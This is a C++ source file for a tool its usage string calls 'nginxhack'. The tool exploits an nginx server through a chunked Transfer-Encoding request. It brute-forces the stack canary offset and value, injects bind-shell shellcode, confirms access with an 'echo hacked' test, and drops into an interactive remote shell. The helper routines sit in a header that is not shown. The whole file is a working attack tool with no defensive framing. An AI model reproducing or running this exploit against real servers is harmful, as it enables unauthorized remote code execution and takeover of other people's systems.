#include "hdr.h"

int main(int argc, char* argv[]) {
    if (argc != 4) {
        cout << "Usage:" << endl << "nginxhack [target] [target port] [target bind port]" << endl;
        return 1;
    }

    WSADATA wd;
    SOCKET sock = INVALID_SOCKET;
    addrinfo* res = NULL, *ptr = NULL, hints;
    
    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) {
        cout << "Error starting winsock" << endl;
        return 0;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(argv[1], argv[2], &hints, &res) != 0) {
        cout << "The target could not be found." << endl;
        return 0;
    }

    for (ptr = res; ptr != NULL; ptr = ptr->ai_next) {
        sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (sock == INVALID_SOCKET) {
            cout << "Error creating socket." << endl;
            return 0;
        }
            
        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }

        break;
    }
    
    if (ptr == NULL) {
        cout << "Failed to connect to server" << endl;
        return 1;
    }
    freeaddrinfo(res);
    
    string payload = "GET / HTTP/1.1\r\nHost: " + string(argv[1]) + "\r\nTransfer-Encoding: chunked\r\n\r\n";

    cout << "Bruteforcing canary offset..." << endl;
    int coff = get_coff(ptr, payload);
    cout << "Found canary offset: " << coff << endl;
    for (int i = 0; i < coff; i++) {
        payload += "t";
    }

    cout << endl << "Bruteforcing canary..." << endl;
    string canary = get_canary(ptr, payload);
    if (canary.length() != 8) {
        cout << "Failed to find canary" << endl;
        return 0;
    }
    payload += canary;
    cout << "Found canary" << endl;
    
    payload += (char*)bind_shell(stoi(argv[3]));

    cout << endl << "Injecting bind shell..." << endl;
    if (send(sock, payload.c_str(), payload.length(), NULL) == SOCKET_ERROR) {
        cout << "Error sending payload" << endl;
        return 0;
    }
    
    cout << endl << "Gaining access..." << endl;
    if (send(sock, "echo hacked", 12, NULL) == SOCKET_ERROR) {
        cout << "Error sending command" << endl;
        return 0;
    }

    char buf[500];
    if (recv(sock, buf, 6, NULL) == SOCKET_ERROR || string(buf).substr(0, 6) != "hacked") {
        cout << "The bind shell didn't work. This is probably because the target server isn't running linux." << endl;
        return 0;
    }

    cout << "Gained access!" << endl << "Now type your commands!" << endl << endl;
    shell(sock, buf);

    return 1;
}
